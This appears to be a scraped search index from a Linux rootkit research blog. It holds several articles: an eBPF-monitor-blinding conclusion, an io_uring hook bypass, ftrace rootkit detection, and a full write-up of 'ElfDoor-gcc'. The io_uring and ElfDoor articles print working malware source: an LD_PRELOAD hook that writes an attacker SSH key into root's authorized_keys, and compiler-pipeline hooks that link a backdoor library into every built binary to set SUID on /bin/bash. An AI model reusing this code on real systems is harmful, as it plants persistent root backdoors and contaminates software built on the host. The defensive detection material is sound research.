invisible to Tracee Why The Bypass Works:\nTracee relies on BPF iterators for process enumeration and ringbuffers for syscall events. Our hooks intercept both. The iterator hook ensures hidden processes never appear in enumeration. The ringbuffer hooks prevent syscall events from being recorded.\nAdditional Tools GhostScan:\nGhostScan attempts to detect hidden processes by comparing different enumeration methods. It uses BPF iterators to walk the task list.\nResult: Hidden processes remain invisible. Our iterator hooks ensure consistency across all enumeration methods.\nDecloaker:\nDecloaker tries to reveal hidden network connections by using multiple detection techniques including BPF iterators.\nResult: Hidden connections remain invisible. Our iterator and socket filtering hooks ensure network connections on our target port never appear.\nCustom eBPF Tools:\nSeveral custom security tool using BPF iterators, ringbuffers, or perf events for monitoring will be equally blind to our hidden processes.\nThe Hard Truth:\nIf an attacker gains the ability to load kernel modules, they control the kernel\u0026rsquo;s view of reality. eBPF security tools run inside the kernel and thus cannot fully protect a compromised kernel. The only reliable defense is preventing kernel compromise in the first place.\nConclusion This research demonstrates that eBPF-based security tools, while powerful, operate under a false assumption: that kernel-level observability provides complete visibility. In reality, when an attacker achieves kernel-level access through a loaded module, they can systematically blind these tools by hooking the very mechanisms they rely on.\nKey Findings:\nTarget the data path, not the program: If you can control the kernel-side plumbing that carries events to user space, the eBPF program can \u0026ldquo;run correctly\u0026rdquo; while its output never arrives.\nEnumerators are just another surface: Iterator-based tools depend on bpf_iter_run_prog() and seq_file writes. Filtering there can make multiple views of the system agree on a lie.\nEvent delivery is a choke point: Whether a tool uses ring buffer (BPF_MAP_TYPE_RINGBUF) or perf buffer (BPF_MAP_TYPE_PERF_EVENT_ARRAY), the kernel→userspace boundary creates a natural interception point.\nState can be selectively erased: Map lookups/updates are convenient places to make hidden PIDs appear \u0026ldquo;not found\u0026rdquo; without breaking the rest of the system.\nOnce the kernel is hostile, observability is best-effort: eBPF improves visibility under a trusted kernel. It does not harden a compromised kernel.\nWhat this PoC demonstrates:\nSuccessfully bypassed Falco, Tracee, GhostScan, and Decloaker Demonstrated complete process and network hiding from eBPF tools Proved that kernel-level access fundamentally breaks the security model Showed that observability itself can be made optional for an attacker Defensive Implications:\nSecurity cannot rely solely on kernel-level observability. Defense-in-depth requires:\nPreventing kernel compromise through Secure Boot and signed modules Multi-layer monitoring including network-level detection Hardware-rooted trust and attestation Accepting that a compromised kernel cannot secure itself The Future:\nThis cat-and-mouse game will continue. Security vendors will develop new detection methods. Attackers will find new bypass techniques :)\nBottom line: once the kernel is attacker-controlled, the system\u0026rsquo;s \u0026ldquo;ground truth\u0026rdquo; is no longer trustworthy. eBPF raises the bar under a trusted kernel, but it can\u0026rsquo;t be the last line of defense against a hostile one.\nThe real win is preventing kernel compromise in the first place (boot trust, module enforcement, and layered detection outside the host).\nResearch Resources:\nSingularity Rootkit: https://github.com/MatheuZSecurity/Singularity Rootkit Research Community: https://discord.gg/66N5ZQppU7 Contact: X (@MatheuzSecurity) | Discord (kprobe) Responsible Disclosure:\nThis research has been conducted for educational purposes. All techniques described are intended to improve defensive capabilities by understanding attacker methodologies. The code is published to help security researchers develop better detection and prevention mechanisms.\nIf you\u0026rsquo;re a security vendor affected by these techniques, please reach out for collaboration on improved detection strategies.\n","permalink":"http://localhost:1313/hacking/ebpf-security-tools-hacking/","summary":"\u003cp\u003eStealthy Kernel Rootkit: \u003ca href=\"https://github.com/MatheuZSecurity/Singularity\"\u003ehttps://github.com/MatheuZSecurity/Singularity\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eRootkit Researchers: \u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eMe: \u003ca href=\"https://www.linkedin.com/in/mathsalves/\"\u003ehttps://www.linkedin.com/in/mathsalves/\u003c/a\u003e\u003c/p\u003e\n\u003ch1 id=\"introduction\"\u003eIntroduction\u003c/h1\u003e\n\u003cp\u003eLinux security tooling has leaned heavily into eBPF. Projects like Falco, Tracee, and Tetragon made kernel-level telemetry feel like a step change: richer context, low overhead, and visibility that\u0026rsquo;s difficult to evade from user space.\u003c/p\u003e\n\u003cp\u003eBut that promise quietly depends on a threat model: the kernel is assumed to be a trustworthy observer.\u003c/p\u003e\n\u003cp\u003eThis article explores what happens when that assumption breaks, specifically, when an attacker can execute code in the kernel (e.g., via a loaded module). In that world, the most valuable targets aren\u0026rsquo;t the eBPF programs themselves, but the plumbing around them: iterators, event delivery paths (ring buffer / perf buffer), perf submission, and map operations that turn kernel activity into user-space signals.\u003c/p\u003e","title":"Breaking eBPF Security: How Kernel Rootkits Blind Observability Tools"},{"content":" This article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as open(), write(), and close(), which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\nWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the open() call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., io_uring_enter, io_uring_setup) for coordination.\nIntroduction to io_uring io_uring is a Linux kernel interface introduced by Jens Axboe in kernel 5.1 to provide high-performance asynchronous I/O operations. Traditional I/O operations in Linux involve costly system calls and context switches. io_uring allows applications to queue I/O requests in shared memory, significantly reducing the number of syscalls and context switches required for I/O, although not completely eliminating them. This results in lower overhead compared to traditional read/write patterns.\nKey Benefits of io_uring:\nLower syscall overhead Direct submission of I/O reduces the frequency and cost of context switches Kernel land execution reduces visibility to userland hooks This makes io_uring an attractive alternative not only for performance-critical applications but also for offensive tooling that seeks to avoid traditional monitoring vectors.\nRootkits via LD_PRELOAD A common technique used in userland rootkits is to hook libc functions like open(), read(), and write() using LD_PRELOAD. By intercepting these calls, the rootkit can hide files, inject backdoors, or modify behavior.\nExample: LD_PRELOAD Rootkit Explained This example demonstrates a userspace hook for the open() function to detect when a process tries to open /root/.ssh/authorized_keys, and instead injects an SSH key, enabling unauthorized access.\n// https://discord.gg/66N5ZQppU7 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;stdarg.h\u0026gt; typedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; static int target(const char *pathname) { if (pathname == NULL) return 0; return strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0; } int open(const char *pathname, int flags, ...) { va_list args; mode_t mode = 0; if (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading orig open function: %s\\n\u0026#34;, dlerror()); exit(EXIT_FAILURE); } } if (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } if (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); if (fd \u0026lt; 0) { return fd; } const char *sshkey = \u0026#34;ssh-rsa ....snip kali@kali\\n\u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); return orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } if (flags \u0026amp; O_CREAT) { return orig_open(pathname, flags, mode); } else { return orig_open(pathname, flags); } } Detailed Behavior of the LD_PRELOAD Rootkit This rootkit relies on the LD_PRELOAD environment variable to hijack the open() function call from the standard C library. Here\u0026rsquo;s a breakdown of its logic and behavior:\ntypedef int (*open_func_type)(const char *, int, ...); static open_func_type orig_open = NULL; A new function pointer type is defined for open(), allowing us to call the real open() after we hook it. orig_open will be initialized using dlsym() to point to the original function.\nTarget File Detection\nstatic int target(const char *pathname) { return pathname \u0026amp;\u0026amp; ( strcmp(pathname, \u0026#34;/root/.ssh/authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;authorized_keys\u0026#34;) == 0 || strcmp(pathname, \u0026#34;.ssh/authorized_keys\u0026#34;) == 0 ); } The target() function checks if the file being accessed is the SSH authorized keys file. It performs a simple strcmp() against several known variants of the authorized_keys path.\nHooking the open() Function\nint open(const char *pathname, int flags, ...) { This is our hook. Because the name matches open() and LD_PRELOAD is set, all calls to open() will now invoke this custom implementation.\nif (!orig_open) { orig_open = (open_func_type)dlsym(RTLD_NEXT, \u0026#34;open\u0026#34;); if (!orig_open) { fprintf(stderr, \u0026#34;Error loading original open: %s \u0026#34;, dlerror()); exit(EXIT_FAILURE); } } On the first call, we use dlsym(RTLD_NEXT, \u0026quot;open\u0026quot;) to resolve the real open() function from the next link in the shared object chain. This avoids recursion.\nif (flags \u0026amp; O_CREAT) { va_start(args, flags); mode = va_arg(args, int); va_end(args); } If the O_CREAT flag is present, we extract the mode_t argument from the variadic list.\nif (target(pathname)) { int fd = orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_WRONLY | O_CREAT | O_TRUNC, 0600); If the target file is detected, we open it with write-only, create, and truncate flags. This ensures that previous content is removed.\nconst char *sshkey = \u0026#34;ssh-rsa AAAAB3...snip... kali@kali \u0026#34;; write(fd, sshkey, strlen(sshkey)); close(fd); A malicious SSH public key is written into the file, and the file is closed.\nreturn orig_open(\u0026#34;/root/.ssh/authorized_keys\u0026#34;, O_RDWR | O_APPEND, 0600); } After the injection, the file is reopened with read/write and append flags, and the resulting file descriptor is returned to the caller, maintaining expected behavior.\nreturn (flags \u0026amp; O_CREAT) ? orig_open(pathname, flags, mode) : orig_open(pathname, flags); If the file is not one of the targets, the call is passed directly to the original open() function, maintaining transparency.\nSummary of Behavior:\nIntercepts calls to open() via LD_PRELOAD ilters paths that match authorized_keys Overwrites the file and injects a SSH public key Reopens the file with appropriate permissions to avoid suspicion Acts transparently for all other files, mimicking normal behavior This behavior demonstrates how dangerous userland hooks can be when used for malicious purposes. However, such rootkits rely entirely on userland mechanisms, which is what io_uring is able to bypass entirely.\nBypassing the Hook with io_uring Here, we use io_uringto bypass the hooked open() function by submitting kernel level I/O requests directly.\nFull Code with Explanations:\n#define _GNU_SOURCE #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;fcntl.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; #include \u0026lt;sys/uio.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #include \u0026lt;liburing.h\u0026gt; #define FILE_PATH \u0026#34;/root/.ssh/authorized_keys\u0026#34; #define CONTENT \u0026#34;random\u0026#34; int main() { struct io_uring ring; int ret, fd; struct iovec iov; const char *content = CONTENT; size_t content_len = strlen(content); ret = io_uring_queue_init(1, \u0026amp;ring, 0); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_queue_init\u0026#34;); return 1; } struct io_uring_sqe *sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); return 1; } io_uring_prep_open(sqe, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); io_uring_sqe_set_data(sqe, (void *)1); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); return 1; } struct io_uring_cqe *cqe; ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); return 1; } fd = cqe-\u0026gt;res; io_uring_cqe_seen(\u0026amp;ring, cqe); if (fd \u0026lt; 0) { fprintf(stderr, \u0026#34;Failed to open file: %d\\n\u0026#34;, fd); return 1; } sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); io_uring_sqe_set_data(sqe, (void *)2); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_wait_cqe\u0026#34;); close(fd); return 1; } if (cqe-\u0026gt;res \u0026lt; 0) { fprintf(stderr, \u0026#34;Write failed: %d\\n\u0026#34;, cqe-\u0026gt;res); } io_uring_cqe_seen(\u0026amp;ring, cqe); sqe = io_uring_get_sqe(\u0026amp;ring); if (!sqe) { fprintf(stderr, \u0026#34;Could not get SQE\\n\u0026#34;); close(fd); return 1; } io_uring_prep_close(sqe, fd); io_uring_sqe_set_data(sqe, (void *)3); ret = io_uring_submit(\u0026amp;ring); if (ret \u0026lt; 0) { perror(\u0026#34;io_uring_submit\u0026#34;); close(fd); return 1; } ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); if (ret == 0) { io_uring_cqe_seen(\u0026amp;ring, cqe); } io_uring_queue_exit(\u0026amp;ring); printf(\u0026#34;gg!\\n\u0026#34;); return 0; } Let\u0026rsquo;s analyze the logic of the program step by step, fully detailing each stage:\n1. Initialization ret = io_uring_queue_init(1, \u0026amp;ring, 0); This sets up the io_uring interface with a submission queue depth of 1 (meaning one submission queue entry at a time) and assigns the ring buffer context to ring. This sets up the shared memory structure used between userspace and kernel.\n2. Opening the Target File with open sqe = io_uring_get_sqe(\u0026amp;ring); io_uring_prep_open(sqe, AT_FDCWD, FILE_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0644); This obtains a submission queue entry (SQE) and prepares an open. Unlike using libc\u0026rsquo;s open(), this is handed off directly to the kernel. The file /root/.ssh/authorized_keys will be opened in write-only mode, created if it doesn’t exist, and truncated if it does.\n3. Submitting the Request ret = io_uring_submit(\u0026amp;ring); All pending SQEs are submitted to the kernel. This includes the open operation we just prepared.\n4. Waiting for the Open to Complete ret = io_uring_wait_cqe(\u0026amp;ring, \u0026amp;cqe); fd = cqe-\u0026gt;res; Here we block until the kernel reports the result of the previous open operation. If successful, cqe-\u0026gt;res holds the file descriptor. Otherwise, it’s a negative errno value.\n5. Writing to the File iov.iov_base = (void *)content; iov.iov_len = content_len; io_uring_prep_writev(sqe, fd, \u0026amp;iov, 1, 0); We set up a writev with a single iovec structure pointing to our content buffer. Again, this bypasses libc and is submitted to the kernel through io_uring_submit().\n6. Closing the File Descriptor io_uring_prep_close(sqe, fd); This prepares a close syscall for the previously obtained file descriptor, cleaning up the resource after the write is complete.\n7. Cleanup io_uring_queue_exit(\u0026amp;ring); This releases all resources associated with the io_uring instance.\nThe complete execution is handled via direct syscall preparation and completion queues, meaning no libc API (like open(), write(), or close()) is ever invoked. This effectively bypasses userspace interception mechanisms based on dynamic linking and LD_PRELOAD.\nNo libc Call: Rootkits using LD_PRELOAD hook userland functions. io_uring interacts directly with the kernel. Kernel Submission: SQEs (Submission Queue Entries) are placed in a shared ring buffer and processed by the kernel, without invoking libc functions. No Function Symbol Interception: Since we never call open() or write() directly, dlsym(RTLD_NEXT, \u0026hellip;) never sees these calls. Security Implications While io_uring was designed for performance, it can also be abused as a stealthy vector to bypass userland monitoring. Malware or red team operators can leverage this interface to:\nInject backdoors undetected by LD_PRELOAD monitors Exfiltrate files or tamper with data covertly Operate beneath traditional EDR agents that rely on userland instrumentation Although this technique bypasses userland hooks, it does not evade kernel level security mechanisms such as LSM (Linux Security Modules) and () and eBPF. All I/O requests issued via io_uring are still subject to the same permission and inspection constraints enforced by the kernel, regardless of how they\u0026rsquo;re submitted. This is because io_uring still operates through the kernel\u0026rsquo;s I/O submission mechanism. Regardless of how I/O is submitted, via traditional syscalls or through io_uring, it still traverses the kernel and remains subject to kernel-level access control and monitoring\nFor example, LSMs like SELinux or AppArmor still validate access controls when files are opened or modified, regardless of whether the request came from io_uring or a traditional open() call. Similarly, eBPF-based monitors can observe and filter activity at the point where the kernel processes I/O requests.\nPOCs In the image above, see that no open() and openat() functions were used.\nConclusion io_uring offers more than just performance, it can also be abused as an anti-forensics or bypass technique when rootkits rely on userspace hooking mechanisms. Although powerful, its misuse should raise awareness of how modern kernel features can impact the offensive/defensive balance in Linux systems.\nBecome a part of Rootkit Researchers\nhttps://discord.gg/66N5ZQppU7 References https://kernel.dk/io_uring.pdf\n","permalink":"http://localhost:1313/hacking/using-io-uring-to-break-linux-rootkits-hooks/","summary":"\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/TGcNnzI.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis article explores a technique to bypass Userland based hooks, such as those implemented via LD_PRELOAD by leveraging io_uring, a modern Linux kernel interface for asynchronous I/O. By bypassing traditional libc wrappers, such as \u003ccode\u003eopen()\u003c/code\u003e, \u003ccode\u003ewrite()\u003c/code\u003e, and \u003ccode\u003eclose()\u003c/code\u003e, which are commonly intercepted in LD_PRELOAD based hooks, it\u0026rsquo;s possible to evade detection or interference by such malicious userspace mechanisms.\u003c/p\u003e\n\u003cp\u003eWe demonstrate this by comparing a simple LD_PRELOAD rootkit that hooks the \u003ccode\u003eopen()\u003c/code\u003e call with a program that uses io_uring to interact with the file system while still leveraging syscalls internally, io_uring minimizes user‑kernel transitions by batching operations through shared memory queues, issuing only a few essential syscalls (e.g., \u003ccode\u003eio_uring_enter\u003c/code\u003e, \u003ccode\u003eio_uring_setup\u003c/code\u003e) for coordination.\u003c/p\u003e","title":"breaking ld_preload rootkit hooks"},{"content":"Hello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\nhttps://discord.gg/66N5ZQppU7 What is Ftrace? ftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\nMain Features:\nFunction Tracing: Records kernel function calls, including order and execution time. Event Tracing: Monitors system events. Custom Filters: Focus on specific functions or events via configuration files. Support for dynamic tracers like kprobes and integration with tools like perf. On more current systems, tracing is enabled by default, but if not, simply set it:\nmount -t tracefs nodev /sys/kernel/tracing Ways to detect ftrace-based rootkits Detecting an LKM rootkit that uses ftrace is actually easier than you might think. If a rootkit uses ftrace, it is automatically detectable, because currently (at the time I am writing this post) there is no rootkit that I have seen that can hide from some tracing features.\nI will use the dreaded KoviD rootkit that uses ftrace as hooking.\nNow with KoviD loaded and hidden, we can begin.\nKoviD can be easily detected in /sys/kernel/tracing/enabled_functions, this file basically lists the kernel functions currently enabled for tracing.\nKoviD can also be detected in /sys/kernel/tracing/touched_functions, this file shows all functions that were every traced by ftrace or a direct trampoline (only for kernel 6.4+)\nin the current version of kovid, its functions do not appear in /sys/kernel/tracing/available_filter_functions, but it still leaves traces in this file, which basically lists kernel functions that can be filtered for tracing.\nNo ftrace based rootkit that I have seen so far can hide 100% and can be easily found, they always leave some trace behind.\nYou can also check my github repository, it contains several really cool things to detect and remove modern rootkits.\nCheat sheet: Detecting and Removing Linux Kernel Rootkit ","permalink":"http://localhost:1313/hacking/ftrace-rootkit/","summary":"\u003cp\u003eHello! Welcome to this post! Well, I have a server that is focused on rootkit research, both for Linux and Windows, feel free to come and participate in our community.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://discord.gg/66N5ZQppU7\"\u003ehttps://discord.gg/66N5ZQppU7\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"what-is-ftrace\"\u003eWhat is Ftrace?\u003c/h2\u003e\n\u003cp\u003eftrace (Function tracing) is a kernel function tracer. It helps a lot with debugging the Linux kernel, tracing functions, events, and of course, you can use ftrace to do hooking, etc.\u003c/p\u003e\n\u003cp\u003eMain Features:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eFunction Tracing: Records kernel function calls, including order and execution time.\u003c/li\u003e\n\u003cli\u003eEvent Tracing: Monitors system events.\u003c/li\u003e\n\u003cli\u003eCustom Filters: Focus on specific functions or events via configuration files.\u003c/li\u003e\n\u003cli\u003eSupport for dynamic tracers like kprobes and integration with tools like perf.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eOn more current systems, tracing is enabled by default, but if not, simply set it:\u003c/p\u003e","title":"Detecting rootkits based on ftrace hooking."},{"content":"Hijacking GCC with LD_PRELOAD Introduction If you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries without touching the source code, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during linking.\nIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\nThis is a simple project, with simple ideas and mechanisms, and it can certainly be improved.\nElfDoor-gcc repo: https://github.com/MatheuZSecurity/ElfDoor-gcc\nUnderstanding the Compilation Process with GCC Before attacking the compilation process, it\u0026rsquo;s essential to understand how it works\nGCC functions as more than a basic compiler; it operates as a kind of pipeline manager for multiple internal tools, depending on the requirements:\ngcc main.c -o main\nThis command has a sequence of steps:\nPreprocessing (cpp)\nExpands macros, includes header files, and removes comments.\nGenerates a .i file containing the \u0026ldquo;expanded\u0026rdquo; source code.\nCompilation (cc1)\nConverts the .i code into assembly.\nPerforms syntax and semantic checks, along with optimizations.\nAssembly (as)\nTranslates the assembly code into an object file (.o). Linkagem (collect2 → ld)\nCombines object files, resolves symbols, and produces the final binary.\ngcc invokes collect2, which in turn calls ld, the actual linker.\nThis final stage linking, is where the hijacking occurs. If we manage to intercept the moment when ld is invoked, we can modify its arguments and inject our own malicious library\nAttack Chain The core concept is to leverage LD_PRELOAD to override critical functions like execve and posix_spawn, enabling us to intercept process execution.\nOur project will consist of:\nmain.c: Hooks execve and posix_spawn, inspects the arguments, and, if appropriate, injects parameters to include our malicious library.\nb.a: The library containing the malicious code we want to embed in the final binary\nInstall.sh: Compiles and loads our malicious LD_PRELOAD.\nhello.c: A simple program that just prints \u0026ldquo;Hello,\u0026rdquo; but after compiling and executing, it will run our malicious code.\nElfDoor Hooks The main.c file is responsible for hooking process execution functions, such as execve and posix_spawn, to inject a malicious static library called b.a into the binary compilation process. This technique allows any binary generated on a compromised machine to carry a \u0026ldquo;hidden\u0026rdquo; payload without the developer noticing.\nThe structure starts with the inclusion of the essential libraries:\n#define _GNU_SOURCE #include \u0026lt;dlfcn.h\u0026gt; #include \u0026lt;spawn.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; extern char **environ; The use of _GNU_SOURCE is essential to enable GNU libc specific extensions, such as the interception of execve and posix_spawn. Including \u0026lt;dlfcn.h\u0026gt; allows the use of dlsym, which is crucial for obtaining pointers to the original functions and diverting execution.\nNext, we have auxiliary functions responsible for determining if the running binary is relevant. For example, is_gcc detects whether the binary being executed is the GCC, cc, or clang compiler:\nint is_gcc(const char *path) { const char *progname = strrchr(path, \u0026#39;/\u0026#39;); progname = progname ? progname + 1 : path; return strcmp(progname, \u0026#34;gcc\u0026#34;) == 0 || strcmp(progname, \u0026#34;cc\u0026#34;) == 0 || strcmp(progname, \u0026#34;clang\u0026#34;) == 0; } The code above extracts the program name from the full path (e.g., /usr/bin/gcc) and directly compares it with known compiler names. The same pattern is used to identify collect2 and ld in the is_collect2 and is_linker functions.\nThen, the should_inject function determines whether the injection should occur, based on the compiler arguments:\nint should_inject(char *const argv[]) { for (int i = 0; argv[i]; ++i) { if (strcmp(argv[i], \u0026#34;-c\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-E\u0026#34;) == 0 || strcmp(argv[i], \u0026#34;-S\u0026#34;) == 0) return 0; } return 1; } These flags (-c, -E, -S) are used in intermediate compilation processes that do not generate final executables. Since the goal is to inject code into the final binary, these modes are ignored.\nThe most important function is inject_args, which constructs a new argument list by inserting the static library:\nchar **inject_args(const char *bin_path, char *const argv[], int extra) { int argc; for (argc = 0; argv[argc]; ++argc); const char *lib_path = \u0026#34;/dev/shm/b.a\u0026#34;; for (int i = 0; i \u0026lt; argc; ++i) { if (argv[i] \u0026amp;\u0026amp; strstr(argv[i], \u0026#34;b.a\u0026#34;) != NULL) { return NULL; } } const char **new_argv = malloc(sizeof(char *) * (argc + extra + 1)); if (!new_argv) return NULL; int i = 0, j = 0; for (; i \u0026lt; argc; ++i) new_argv[j++] = argv[i]; const char *arg1, *arg2, *arg3; if (is_gcc(bin_path)) { arg1 = \u0026#34;-Wl,--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;-Wl,--no-whole-archive\u0026#34;; } else { arg1 = \u0026#34;--whole-archive\u0026#34;; arg2 = lib_path; arg3 = \u0026#34;--no-whole-archive\u0026#34;; } new_argv[j++] = arg1; new_argv[j++] = arg2; new_argv[j++] = arg3; new_argv[j] = NULL; return (char **)new_argv; } The inject_args function modifies a program\u0026rsquo;s argument list by conditionally adding a static library (/dev/shm/b.a), depending on the binary, and prevents duplication of this library in the list.\nThe hooking of execve happens as follows:\nint execve(const char *pathname, char *const argv[], char *const envp[]) { static int (*real_execve)(const char *, char *const [], char *const []) = NULL; if (!real_execve) real_execve = dlsym(RTLD_NEXT, \u0026#34;execve\u0026#34;); if ((is_gcc(pathname) || is_collect2(pathname) || is_linker(pathname)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(pathname, argv, 3); if (new_argv) { int result = real_execve(pathname, new_argv, envp); free(new_argv); return result; } } return real_execve(pathname, argv, envp); } When the process attempts to execute gcc, ld, or similar, the execve hook intercepts the call. It calls the inject_args function to modify the arguments, and if the modification is successful, it executes the binary with the new argument list. The original execve function is called via the pointer obtained with dlsym, ensuring that the actual call still happens, but with the malicious code included.\nFinally, the posix_spawn function is handled with identical logic:\nint posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *file_actions, const posix_spawnattr_t *attrp, char *const argv[], char *const envp[]) { static int (*real_posix_spawn)(pid_t *, const char *, const posix_spawn_file_actions_t *, const posix_spawnattr_t *, char *const [], char *const []) = NULL; if (!real_posix_spawn) real_posix_spawn = dlsym(RTLD_NEXT, \u0026#34;posix_spawn\u0026#34;); if ((is_gcc(path) || is_collect2(path) || is_linker(path)) \u0026amp;\u0026amp; should_inject(argv)) { char **new_argv = inject_args(path, argv, 3); if (new_argv) { int result = real_posix_spawn(pid, path, file_actions, attrp, new_argv, envp); free(new_argv); return result; } } return real_posix_spawn(pid, path, file_actions, attrp, argv, envp); } This hook ensures that even when gcc or ld use posix_spawn internally, the malicious library will still be injected. It is a layer of compatibility that makes the our malware even more effective.\nThe entire mechanism is activated when the library compiled with this main.c is loaded via LD_PRELOAD, a legitimate Linux feature used to replace functions from standard libraries. Any compilation performed on the system can be automatically compromised.\nMalicious code: b.c The purpose of the b.c code is to modify the permissions of /bin/bash to allow it to be executed with elevated privileges.\n#include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/stat.h\u0026gt; __attribute__((constructor)) void backdoor() { chmod(\u0026#34;/bin/bash\u0026#34;, 04755); } In other words, as soon as some code is compiled using GCC, for example, it will inject our backdoor inside, and if executed as root, it will set the SUID on /bin/bash.\nPOC Conclusion With this simple hook, we’re able to intercept GCC’s compilation pipeline and inject a malicious library during the linking stage, all without modifying the source code.\nThe result is a seemingly legitimate binary that silently carries a hidden payload, ready to be executed.\nPlease feel free to contact me on Twitter if you have any questions.\nRootkit Researchers\n","permalink":"http://localhost:1313/hacking/gcc/","summary":"\u003ch1 id=\"hijacking-gcc-with-ld_preload\"\u003eHijacking GCC with LD_PRELOAD\u003c/h1\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"https://i.imgur.com/MmPbrjL.png\" alt=\"imgur\"  /\u003e\n\u003c/p\u003e\n\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eIf you\u0026rsquo;ve ever wondered how it\u0026rsquo;s possible to inject malicious code into binaries \u003cstrong\u003ewithout touching the source code\u003c/strong\u003e, and using only standard Linux tools, this article is for you. We\u0026rsquo;ll explore a very cool technique that intercepts the compilation process with LD_PRELOAD, modifying the commands executed and forcing the inclusion of a malicious library during \u003cstrong\u003elinking\u003c/strong\u003e.\u003c/p\u003e\n\u003cp\u003eIn the end, the compiled binary looks legitimate, but it is infected with embedded malicious code, ready to be executed at the right time.\u003c/p\u003e","title":"ElfDoor-gcc"},{"content":" Stealthy Kernel Rootkit: https://github.com/MatheuZSecurity/Singularity\nRootkit Researchers: https://discord.gg/66N5ZQppU7\nIntroduction Security solutions continue to intensify. Modern EDRs like Elastic Security, integrated with Elastic Defend, employ multiple detection layers including YARA signatures and behavioral analysis to identify Linux kernel rootkits, triggering 26+ alerts on a single malicious module.\nThis article demonstrates how to systematically evade these defenses. We present a comprehensive case study of developing a Linux rootkit that successfully bypasses Elastic Security\u0026rsquo;s detection mechanisms through obfuscation, fragmentation, and staged execution techniques. All content is strictly for educational purposes only.\nTable of Contents Introduction Understanding the Threat Landscape: Elastic YARA Rules Primary Detection Rules Detection Signature Analysis The Singularity Rootkit: Capabilities Overview Core Features Evasion Technique 1: Symbol Name Randomization The Problem The Solution: Intelligent Name Randomization Evasion Technique 2: Module Fragmentation The Problem The Solution: Fragment + XOR Encoding + In-Memory Loading Custom Loader via memfd_create Evasion Technique 